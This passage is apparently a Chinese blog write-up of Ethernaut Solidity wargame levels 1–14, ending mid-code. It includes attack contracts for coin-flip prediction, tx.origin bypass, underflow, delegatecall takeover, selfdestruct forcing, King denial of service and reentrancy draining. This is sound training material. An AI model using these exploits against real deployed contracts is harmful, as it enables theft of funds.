{"title":"","uid":"f73a8e23e6f6f669cf99c7dba8fa0722","slug":"Ethernaut题解","date":"2022-12-07T15:27:09.633Z","updated":"2023-03-24T14:32:50.645Z","comments":true,"path":"api/articles/Ethernaut题解.json","keywords":null,"cover":[],"content":"<pre><code>title: Ethernaut题解1-18\r\ndate: 2023-03-24 22:20:57\r\ntags: solidity靶场\r\ncover: 'https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg'</code></pre>\r\n<h1 id=\"ethernaut\">Ethernaut</h1>\r\n<h2 id=\"hello\">1.Hello</h2>\r\n<p>建立MetaMask账号连接一下<br>\r\n按F12打开浏览器的控制台，输入<code>help()</code></p>\r\n<p><img src=\"https://s2.loli.net/2022/12/07/Mu9PwLW6raEtUQq.png\" alt=\"image-20221207233231321.png\"></p>\r\n<p>使用命令<code>getBalance(player)</code>查询账户余额，显示<code>pending</code>，可以展开看（或者使用<code>await getBalance(player)</code>）</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/07/jCZNaV5XyI7Ppul.png\" alt=\"image-20221207233558909.png\"></p>\r\n<p><strong>ethernaut合约</strong></p>\r\n<p>在控制台输入<code>ethernaut</code></p>\r\n<p><strong>和ABI互动</strong></p>\r\n<p><code>ethernaut</code> 是一个 <code>TruffleContract</code> 对象，\r\n它包装了部署在区块链上的 <code>Ethernaut.sol</code> 合约.</p>\r\n<p>除此之外，合约的 ABI 还提供了所有的 <code>Ethernaut.sol</code>\r\n公开方法, 比如 <code>owner</code>.</p>\r\n<p><code>ethernaut.owner()</code>或者<code>await ethernaut.owner()</code></p>\r\n<pre><code>await contract.info()</code></pre>\r\n<p>不断互动</p>\r\n<pre><code>await contract.info()\r\n\"You will find what you need in info1().\"\r\n\r\nawait contract.info1()\r\n\"Try info2(), but with \"hello\" as a parameter.\"\r\n\r\nawait contract.info2(\"hello\")\r\n\"The property infoNum holds the number of the next info method to call.\"\r\n\r\nawait contract.infoNum()\r\n42\r\n\r\nawait contract.info42()\r\n\"theMethodName is the name of the next method.\"\r\n\r\nawait contract.theMethodName()\r\n\"The method name is method7123949.\"\r\n\r\nawait contract.method7123949()\r\n\"If you know the password, submit it to authenticate().\"\r\n\r\nawait contract.password()\r\n\"ethernaut0\"\r\n\r\nawait contract.authenticate(\"ethernaut0\")</code></pre>\r\n<h2 id=\"fallback\">2.Fallback</h2>\r\n<p>首先查询合约地址的余额和地址</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/09/X84sGRCwgTDyu5F.png\" alt=\"image-20221209111329754.png\"></p>\r\n<p>调用<code>contribute()</code>函数转入1wei</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/08/GV8bExcPUIol9wv.png\" alt=\"image-20221208171506372.png\"></p>\r\n<p>再次查询余额</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/08/Y6tRT5bIAUs9QeS.png\" alt=\"image-20221208171604933.png\"></p>\r\n<p>要将合约的所有者变成自己，需要调用<code>receive()</code></p>\r\n<p><strong>调用合约不存在的函数就可以触发（或者说转账）</strong></p>\r\n<p>触发函数，地址发生改变</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/09/4rBe2l9xvjJaAwF.png\" alt=\"image-20221209111248280.png\"></p>\r\n<p>将所有的钱取出提交即可</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/09/ctpWViP52D6fkjb.png\" alt=\"image-20221209111510896.png\"></p>\r\n<h2 id=\"fallout\">3.Fallout</h2>\r\n<p>乍一看看不懂，其实拿到合约的权限很简单（可以放在Remix上测试一下）</p>\r\n<pre class=\"solidity\"><code>function Fal1out() public payable {\r\n    owner = msg.sender;\r\n    allocations[owner] = msg.value;\r\n  }</code></pre>\r\n<p>只需要调用构造函数<code>Fallout()</code></p>\r\n<p><img src=\"https://s2.loli.net/2022/12/09/i7AI5muVcHPUNTC.png\" alt=\"image-20221209114007380.png\"></p>\r\n<h2 id=\"coin-flip\">4.Coin Flip</h2>\r\n<p>先贴上源代码和攻击合约</p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract CoinFlip {\r\n\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor() {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue / FACTOR;\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n}\r\n\r\ncontract exploit {\r\n  CoinFlip expFlip;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor(address aimAddr) {\r\n    expFlip = CoinFlip(aimAddr);\r\n  }\r\n\r\n  function hack() public {\r\n    uint256 blockValue = uint256(blockhash(block.number-1));\r\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\r\n    bool guess = coinFlip == 1 ? true : false;\r\n    expFlip.flip(guess);\r\n  }\r\n}</code></pre>\r\n<p>读合约，合约将抛硬币的正反抽象成产生新的区块的哈希值/<code>FACTOR</code>的值是否等于1（这个做除法的过程就是取整，其实就是判断产生新区块的哈希值与<code>FACTOR</code>的大小关系）</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/12/7SgIqvl6LMeaUOw.png\" alt=\"image-20221212203141524.png\"></p>\r\n<p><code>FACTOR</code>=2^255</p>\r\n<p>分析一下源代码里面的<code>revert()</code></p>\r\n<p>判断<code>lastHash==blockValue</code>，如果没有这个判断，直接执行下面的语句<code>lastHash=blockValue</code>，会出现下一个区块还没产生，直接赋值，导致所有的区块的哈希值都一样的情况</p>\r\n<p>攻击合约的代码是产生区块后，根据算出来的结果进行猜测来操作的</p>\r\n<p>在remix上部署攻击合约，填入实例的地址，部署上链，进行<code>hack()</code>攻击</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/12/fBiqZhRtyo1EIg4.png\" alt=\"image-20221212204408545.png\"></p>\r\n<h3 id=\"tip写攻击合约的两种方式\">Tip：写攻击合约的两种方式</h3>\r\n<ul>\r\n<li><p>要将要攻击的合约的源码赋在上面，创建一个CoinFlip类，给他地址（就是上面那个源码）<img src=\"https://s2.loli.net/2022/12/13/LFdfG2OIAxSzg3U.png\" alt=\"image-20221213110659849.png\"></p></li>\r\n<li><p>使用接口<code>interface</code>，加入抽象函数</p></li>\r\n</ul>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface CoinFlip{\r\n  function flip(bool _guess) external returns (bool);\r\n}\r\n\r\ncontract exploit {\r\n  CoinFlip expFlip;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor(address aimAddr) {\r\n    expFlip = CoinFlip(aimAddr);\r\n  }\r\n\r\n  function hack() public {\r\n    uint256 blockValue = uint256(blockhash(block.number-1));\r\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\r\n    bool guess = coinFlip == 1 ? true : false;\r\n    expFlip.flip(guess);\r\n  }\r\n}</code></pre>\r\n<h2 id=\"telephone\">5.Telephone</h2>\r\n<p>贴个源码</p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Telephone {\r\n\r\n  address public owner;\r\n\r\n  constructor() {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  function changeOwner(address _owner) public {\r\n    if (tx.origin != msg.sender) {\r\n      owner = _owner;\r\n    }\r\n  }\r\n}</code></pre>\r\n<p>首先是关于这个<code>tx.origin</code></p>\r\n<p><img src=\"https://s2.loli.net/2022/12/13/Y21kRUocwTpPBNu.png\" alt=\"image-20221213115847106.png\"></p>\r\n<p>分析源码要获得合约，需要调用<code>changeOwner()</code>函数，要满足条件<code>tx.origin!=msg.sender</code>，需要另外写一个合约来调用这个函数，这时<code>tx.origin</code>是受害者合约的<code>msg.sender</code>；而条件中的<code>msg.sender</code>是部署攻击合约的<code>msg.sender</code></p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Telephone {\r\n\r\n  address public owner;\r\n\r\n  constructor() {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  function changeOwner(address _owner) public {\r\n    if (tx.origin != msg.sender) {\r\n      owner = _owner;\r\n    }\r\n  }\r\n}\r\n\r\ncontract call{\r\n    Telephone mytele;\r\n\r\n    constructor(address aim){\r\n        mytele=Telephone(aim);\r\n    }\r\n\r\n    function attack() public{\r\n        mytele.changeOwner(msg.sender);\r\n    }\r\n}</code></pre>\r\n<p><img src=\"https://s2.loli.net/2022/12/13/V3uneMrKSH62Zps.png\" alt=\"image-20221213115808010.png\"></p>\r\n<p><img src=\"https://s2.loli.net/2022/12/13/sb1LfUpo8md4vqr.png\" alt=\"image-20221213160348307.png\"></p>\r\n<h2 id=\"token\">6.Token</h2>\r\n<p>贴源码</p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.0;\r\n\r\ncontract Token {\r\n\r\n  mapping(address =&gt; uint) balances;\r\n  uint public totalSupply;\r\n\r\n  constructor(uint _initialSupply) public {\r\n    balances[msg.sender] = totalSupply = _initialSupply;\r\n  }\r\n\r\n  function transfer(address _to, uint _value) public returns (bool) {\r\n    require(balances[msg.sender] - _value &gt;= 0);\r\n    balances[msg.sender] -= _value;\r\n    balances[_to] += _value;\r\n    return true;\r\n  }\r\n\r\n  function balanceOf(address _owner) public view returns (uint balance) {\r\n    return balances[_owner];\r\n  }\r\n}</code></pre>\r\n<p>看一眼，感觉就是整数溢出的题目（刚开始跟着教程搞了半天没整出来，发现是教程有问题），可以构造<code>balances[msg.sender] - _value</code>发生下溢让其<code>&gt;=0</code>来实现</p>\r\n<p>查自己的余额：<code>await contract.balanceOf(player)</code></p>\r\n<p>转账发生下溢：<code>await contract.transfer('0xd212B8E81bB00838ceDeE960d778F316dC334eee',21)</code></p>\r\n<p>Tip：注意！！！要转给其他用户地址！！！其他用户地址要用单引号<code>'</code>括起来！！！</p>\r\n<p><img src=\"https://s2.loli.net/2022/12/13/8lIvXE3kHMeDhad.png\" alt=\"image-20221213164722442.png\"></p>\r\n<h2 id=\"delegation多想想\">7.Delegation（多想想）</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Delegate {\r\n\r\n  address public owner;\r\n\r\n  constructor(address _owner) {\r\n    owner = _owner;\r\n  }\r\n\r\n  function pwn() public {\r\n    owner = msg.sender;\r\n  }\r\n}\r\n\r\ncontract Delegation {\r\n\r\n  address public owner;\r\n  Delegate delegate;\r\n\r\n  constructor(address _delegateAddress) {\r\n    delegate = Delegate(_delegateAddress);\r\n    owner = msg.sender;\r\n  }\r\n\r\n  fallback() external {\r\n    (bool result,) = address(delegate).delegatecall(msg.data);\r\n    if (result) {\r\n      this;\r\n    }\r\n  }\r\n}</code></pre>\r\n<p>在合约<code>Delegate</code>中，<code>pwn()</code>函数改变owner</p>\r\n<p>而合约<code>Delegation</code>的回退函数调用时，<code>delegatecall</code>将<code>msg.data</code>转发给<code>delegate</code>合约，然后将<code>delegatecall</code>的返回值存入<code>result</code>变量，再继续执行合约代码</p>\r\n<p>题解：</p>\r\n<pre><code>var hold = web3.utils.keccak256(\"pwn()\")\r\ncontract.sendTransaction({data:hold})</code></pre>\r\n<h2 id=\"force\">8.Force</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Force {/*\r\n\r\n                   MEOW ?\r\n         /\\_/\\   /\r\n    ____/ o o \\\r\n  /~____  =ø= /\r\n (______)__m_m)\r\n\r\n*/}</code></pre>\r\n<p>分析：一个空合约，如何使其余额&gt;0 ？？？</p>\r\n<p>可以写一个合约，给其一定的余额，然后利用<code>selfdestruct</code>方法把钱转到空合约里面</p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract deleteContract{\r\n    constructor() payable{}\r\n\r\n    function deleteIt(address _addr) external payable{\r\n        selfdestruct(payable(_addr));\r\n    }\r\n\r\n    function getBalance() external view returns(uint balance){\r\n        balance=address(this).balance;\r\n    }\r\n}</code></pre>\r\n<blockquote>\r\n<p>Tip:构造函数为<code>payable</code>，部署时给合约部署1Wei的余额，自毁时，把钱转入空合约中（也就是这个Instance\r\naddress里面）</p>\r\n</blockquote>\r\n<h2 id=\"vault\">9.Vault</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Vault {\r\n  bool public locked;\r\n  bytes32 private password;\r\n\r\n  constructor(bytes32 _password) {\r\n    locked = true;\r\n    password = _password;\r\n  }\r\n\r\n  function unlock(bytes32 _password) public {\r\n    if (password == _password) {\r\n      locked = false;\r\n    }\r\n  }\r\n}</code></pre>\r\n<blockquote>\r\n<p>关于状态变量在存储中的布局：</p>\r\n<pre><code>每个存储槽将使用32个字节（一个字大小）；\r\n对于每个变量来说，会根据其类型确定以字节为单位的大小；\r\n如果可能的话，少于32字节的多个连续字段将根据以下规则被装入一个存储槽；\r\n一个存储槽中的第一个项目以低位对齐的方式存储。\r\n值类型只使用存储它们所需的字节数。\r\n如果一个值类型在一个存储槽的剩余部分放不下，它将被存储在下一个存储槽。\r\n结构和数组数据总是从一个新的存储槽开始，它们的项目根据这些规则被紧密地打包。\r\n结构或数组数据后面的项目总是开始一个新的存储槽。</code></pre>\r\n</blockquote>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/dMXO7oVlZN9jEAP.png\" alt=\"image-20230116150917588.png\"></p>\r\n<p><code>password</code>在slot1（查看方法写在后面第13题）</p>\r\n<p>使用<code>getStorageAt</code>获取：</p>\r\n<pre class=\"solidity\"><code>await web3.eth.getStorageAt(\"0x578546AB0b765818E84ac03aaBa9eA942a9480B5\",1)</code></pre>\r\n<p><img src=\"C:\\Users\\16017\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230116151208154.png\" alt=\"image-20230116151208154\"></p>\r\n<p>提交即可</p>\r\n<h2 id=\"king\">10.King</h2>\r\n<p>题目要求：成为合约的king，并且永远不被别人取代<img src=\"https://s2.loli.net/2023/03/24/Ex3X8tDOTgl9zZI.png\" alt=\"image-20230124230346470.png\"></p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract King {\r\n\r\n  address king;\r\n  uint public prize;\r\n  address public owner;\r\n\r\n  constructor() payable {\r\n    owner = msg.sender;  \r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  receive() external payable {\r\n    require(msg.value &gt;= prize || msg.sender == owner);\r\n    payable(king).transfer(msg.value);\r\n    king = msg.sender;\r\n    prize = msg.value;\r\n  }\r\n\r\n  function _king() public view returns (address) {\r\n    return king;\r\n  }\r\n}</code></pre>\r\n<p>查询该地址余额为0.001ETH，需要转入更多的钱成为king，并且不被别人取代</p>\r\n<p>需要在构造攻击合约的fallback函数中加个<code>revert()</code>，不接受转账，永远成为king</p>\r\n<p>攻击合约：</p>\r\n<pre class=\"solidity\"><code>contract attack{\r\n    constructor() payable{}\r\n    function callETH(address payable _to, uint256 amount) external payable{\r\n    // 处理下call的返回值，如果失败，revert交易并发送error\r\n    (bool success,) = _to.call{value: amount}(\"\");\r\n        require(success, \"Transfer failed.\");\r\n    }\r\n\r\n    fallback()external payable{\r\n        revert();\r\n    }\r\n}</code></pre>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/MBLuEYnNkHOt8J9.png\" alt=\"image-20230125102617943.png\"></p>\r\n<h2 id=\"re-entrancy\">11.Re-entrancy</h2>\r\n<p>重入攻击</p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.12;\r\n\r\nimport './SafeMath.sol';\r\n\r\ncontract Reentrance {\r\n  \r\n  using SafeMath for uint256;\r\n  mapping(address =&gt; uint) public balances;\r\n\r\n  function donate(address _to) public payable {\r\n    balances[_to] = balances[_to].add(msg.value);\r\n  }\r\n\r\n  function balanceOf(address _who) public view returns (uint balance) {\r\n    return balances[_who];\r\n  }\r\n\r\n  function withdraw(uint _amount) public {\r\n    if(balances[msg.sender] &gt;= _amount) {\r\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\r\n      if(result) {\r\n        _amount;\r\n      }\r\n      balances[msg.sender] -= _amount;\r\n    }\r\n  }\r\n\r\n  receive() external payable {}\r\n}</code></pre>\r\n<p>有点小问题就是题目给我的safemath库没有，就去openzepplin找了一个safemath库拷到本地，由于新版本，所以还要再修改一下</p>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)\r\n\r\npragma solidity ^0.6.12;\r\n\r\n// CAUTION\r\n// This version of SafeMath should only be used with Solidity 0.8 or later,\r\n// because it relies on the compiler's built in overflow checks.\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations.\r\n *\r\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\r\n * now has built in overflow checking.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked \r\n        {\r\n            uint256 c = a + b;\r\n            if (c &lt; a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked\r\n         {\r\n            if (b &gt; a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked\r\n         {\r\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n            // benefit is lost if 'b' is also tested.\r\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked\r\n         {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        // unchecked \r\n        {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // unchecked \r\n        {\r\n            require(b &lt;= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // unchecked \r\n        {\r\n            require(b &gt; 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting with custom message when dividing by zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryMod}.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // unchecked\r\n         {\r\n            require(b &gt; 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}</code></pre>\r\n<p>写攻击合约</p>\r\n<pre class=\"solidity\"><code>contract Attack{\r\n  Reentrance public aim;\r\n\r\n  constructor(address payable aimAddr) public payable{\r\n    aim=Reentrance(aimAddr);\r\n\r\n  }\r\n\r\n  fallback() external payable{\r\n      aim.withdraw(0.001 ether);\r\n  }\r\n\r\n  function attack() public payable{\r\n      aim.donate{value: 0.001 ether}(address(this));\r\n    aim.withdraw(0.001 ether);\r\n  }\r\n\r\n  function withdraw() internal{\r\n    aim.withdraw(attackamout);\r\n  }\r\n}</code></pre>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/9A1mVG8utv6aobZ.png\" alt=\"image-20230125151538042.png\"></p>\r\n<h2 id=\"elevator\">12.Elevator</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface Building {\r\n  function isLastFloor(uint) external returns (bool);\r\n}\r\n\r\n\r\ncontract Elevator {\r\n  bool public top;\r\n  uint public floor;\r\n\r\n  function goTo(uint _floor) public {\r\n    Building building = Building(msg.sender);\r\n\r\n    if (! building.isLastFloor(_floor)) {\r\n      floor = _floor;\r\n      top = building.isLastFloor(floor);\r\n    }\r\n  }\r\n}</code></pre>\r\n<p>题目要求使top为true，但是读题发现在goTo那个函数怎么也没办法实现</p>\r\n<p><code>Building building = Building(msg.sender);</code></p>\r\n<p>这里的<code>msg.sender</code>需要传入一个外部合约，可以自由编写恶意操控</p>\r\n<pre class=\"solidity\"><code>contract Attack{\r\n   Elevator public build;\r\n   constructor(address aim){\r\n     build=Elevator(aim);\r\n   }\r\n\r\n  bool result = true;\r\n  function isLastFloor(uint) external returns (bool){\r\n    if(result==true){\r\n      result=false;\r\n    }\r\n    else{\r\n      result=true;\r\n    }\r\n    return result;\r\n  } \r\n\r\n  function attack() public {\r\n    build.goTo(10);\r\n  }\r\n}</code></pre>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/7w2rY5AkH9Ejzdy.png\" alt=\"image-20230125162526911.png\"></p>\r\n<h2 id=\"privacy\">13.Privacy</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract Privacy {\r\n\r\n  bool public locked = true;\r\n  uint256 public ID = block.timestamp;\r\n  uint8 private flattening = 10;\r\n  uint8 private denomination = 255;\r\n  uint16 private awkwardness = uint16(block.timestamp);\r\n  bytes32[3] private data;\r\n\r\n  constructor(bytes32[3] memory _data) {\r\n    data = _data;\r\n  }\r\n  \r\n  function unlock(bytes16 _key) public {\r\n    require(_key == bytes16(data[2]));\r\n    locked = false;\r\n  }\r\n\r\n  /*\r\n    A bunch of super advanced solidity algorithms...\r\n\r\n      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`\r\n      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,\r\n      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\\r\n      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)\r\n      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU\r\n  */\r\n}</code></pre>\r\n<p>说是可以参考Vault那题，先说说查看反编译内容的方法</p>\r\n<h3 id=\"查看反编译内容\">查看反编译内容</h3>\r\n<p>要在<code>Etherscan</code>上面查看</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/enO6GAh18EVj3yH.png\" alt=\"image-20230125163647495.png\"></p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/4aAUe6PkoEcxSGp.png\" alt=\"image-20230125163705817.png\"></p>\r\n<h3 id=\"状态变量在存储中的布局\">状态变量在存储中的布局</h3>\r\n<h3 id=\"httpslearnblockchain.cndocssolidityinternalslayout_in_storage.html\">（https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html）</h3>\r\n<p>除了动态大小的数组和映射<code>(mapping)</code>，数据的存储方式是从位置<code>0</code>开始连续放置在存储中</p>\r\n<p>存储大小<strong>少于</strong>32字节的多个变量会被打包到一个<strong>存储插槽</strong><code>storage slot</code>中</p>\r\n<ul>\r\n<li>存储插槽的第一项会以低位对齐的方式储存</li>\r\n<li>值类型仅使用存储它们所需的字节</li>\r\n<li>如果存储插槽中的剩余空间不足以储存一个值类型，那么它会被存入下一个存储插槽</li>\r\n<li>结构体<code>struct</code>和数组数据总是会开启一个新插槽（但结构体或数组中的各元素，则按规则紧密打包）</li>\r\n<li>结构体和数组之后的数据也或开启一个新插槽</li>\r\n</ul>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/gYtEjoUd8X4Zz9P.png\" alt=\"image-20230125170112017.png\"></p>\r\n<p>回看题目，stor0是locked，stor1是ID</p>\r\n<p>那么这里的stor5就相当于_key（这边有点不太理解）</p>\r\n<p>利用<code>await web3.eth.getStorageAt(\"0x1D5ddFb5Ce911FEED9B0C5514aD7E58f30b85132\",5)</code>来得到data[2]的值</p>\r\n<p>再用<code>\"0x7b9b6db4bb8f1de0aa618ff30ca9aceb8cf77cd5700414981d7a13c0676304f1\".slice(0,34)</code>获得_key的值（为什么是34？为什么这样子操作没搞懂）</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/yHAZ1Gju2wzap4O.png\" alt=\"image-20230125171949295.png\"></p>\r\n<p>还有一种编写合约的方法</p>\r\n<p><img src=\"https://s2.loli.net/2023/03/24/kO1oLBreqvw5EHJ.png\" alt=\"image-20230125172537475.png\"></p>\r\n<h2 id=\"gatekeeper-one\">14.Gatekeeper One</h2>\r\n<pre class=\"solidity\"><code>// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract GatekeeperOne {\r\n\r\n  address public entrant;\r\n\r\n  modifier gateOne() {\r\n    require(msg.sender != tx.origin);\r\n    _;\r\n  }\r\n\r\n  modifier gateTwo() {\r\n    require(gasleft() % 8191 == 0);\r\n    _;\r\n  }\r\n\r\n  